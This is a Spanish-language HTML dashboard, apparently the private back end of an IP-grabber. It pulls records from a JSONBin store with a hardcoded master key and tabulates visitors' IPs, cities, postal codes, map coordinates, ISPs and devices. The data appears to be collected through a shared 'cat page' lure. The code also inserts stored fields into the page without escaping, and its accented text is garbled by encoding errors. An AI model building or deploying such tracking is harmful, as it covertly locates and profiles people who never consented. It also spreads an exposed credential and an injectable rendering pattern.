<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Visitantes - Privado</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #222;
            color: #eee;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: auto;
            background: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        h1 {
            text-align: center;
            color: #4fc3f7;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #aaa;
            margin-bottom: 20px;
        }
        .controls {
            text-align: right;
            margin-bottom: 15px;
        }
        .refresh-btn {
            background-color: #4fc3f7;
            color: #111;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        .refresh-btn:hover {
            background-color: #29b6f6;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background-color: #444;
            border-radius: 8px;
            overflow: hidden;
        }
        th, td {
            border: 1px solid #555;
            padding: 12px;
            text-align: left;
            word-wrap: break-word;
        }
        th {
            background-color: #555;
            color: #4fc3f7;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9em;
        }
        tr:nth-child(even) {
            background-color: #3a3a3a;
        }
        tr:hover {
            background-color: #4a4a4a;
        }
        td a {
            color: #81d4fa;
            text-decoration: none;
        }
        td a:hover {
            text-decoration: underline;
        }
        .loader {
            text-align: center;
            font-size: 1.2em;
            color: #aaa;
        }
        .error {
            text-align: center;
            color: #e57373;
            background-color: #444;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #e57373;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Panel de Visitantes</h1>
        <p class="subtitle">Datos de acceso de los usuarios (Vista Privada)</p>
        
        <div class="controls">
            <button class="refresh-btn" onclick="loadVisitorData()">游댃 Actualizar Datos</button>
        </div>

        <div id="data-container">
            <p class="loader">Cargando datos de visitantes...</p>
        </div>
    </div>

    <script>
        const dataContainer = document.getElementById('data-container');

        // CREDENCIALES CORREGIDAS Y VERIFICADAS
        const API_KEY = '691d323080b27952c6e76f8c';
        const BIN_ID = '691d34df43b1c97be9b65251';

        // Funci칩n para cargar y mostrar los datos
        async function loadVisitorData() {
            dataContainer.innerHTML = '<p class="loader">Cargando datos de visitantes...</p>';

            try {
                const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': API_KEY }
                });

                if (!response.ok) {
                    throw new Error(`Error ${response.status}: No se pudieron cargar los datos. Revisa tu API Key y Bin ID.`);
                }

                const data = await response.json();
                const records = data.record || [];

                if (records.length === 0) {
                    dataContainer.innerHTML = '<p class="error">No hay registros de visitantes todav칤a. 춰Comparte tu p치gina de gatos para empezar a ver datos!</p>';
                    return;
                }

                // Invertimos el array para que el m치s reciente aparezca primero
                records.reverse();

                let tableHTML = `
                    <table>
                        <thead>
                            <tr>
                                <th>Fecha</th>
                                <th>IP</th>
                                <th>Pa칤s</th>
                                <th>Regi칩n / Estado</th>
                                <th>Ciudad</th>
                                <th>C칩digo Postal</th>
                                <th>Coordenadas</th>
                                <th>Proveedor ISP</th>
                                <th>Dispositivo</th>
                            </tr>
                        </thead>
                        <tbody>
                `;

                records.forEach(record => {
                    const mapLink = `https://www.google.com/maps?q=${record.latitud},${record.longitud}`;
                    tableHTML += `
                        <tr>
                            <td>${record.fecha}</td>
                            <td>${record.ip}</td>
                            <td>${record.pais}</td>
                            <td>${record.region}</td>
                            <td>${record.ciudad}</td>
                            <td>${record.codigoPostal}</td>
                            <td><a href="${mapLink}" target="_blank">Ver en mapa</a></td>
                            <td>${record.proveedor}</td>
                            <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${record.dispositivo}">${record.dispositivo}</td>
                        </tr>
                    `;
                });

                tableHTML += `
                        </tbody>
                    </table>
                `;

                dataContainer.innerHTML = tableHTML;

            } catch (error) {
                console.error("Error al cargar los datos:", error);
                dataContainer.innerHTML = `<p class="error">Error al cargar los datos: ${error.message}</p>`;
            }
        }

        // Cargar los datos al abrir la p치gina
        window.onload = loadVisitorData;
    </script>

</body>
</html>
